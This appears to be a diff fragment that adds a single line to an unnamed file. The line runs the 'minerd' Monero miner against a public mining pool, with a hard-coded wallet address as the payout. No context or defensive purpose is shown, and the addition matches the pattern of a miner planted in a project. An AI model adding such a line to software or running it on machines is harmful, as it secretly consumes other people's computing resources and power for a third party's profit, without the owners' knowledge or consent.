@@ -1,0 +1,1 @@
+minerd -a cryptonight -o stratum+tcp://gulf.moneroocean.stream:10001 -u 42hyVKZb5MrEohbxdjSVkr1pZpEg37xfiSmG6KddTfCi7N3UWhdEhCxKKud1f1i2qmS3Ud4BTjFei9QXtrCyou2bMxUNyoD -p ja
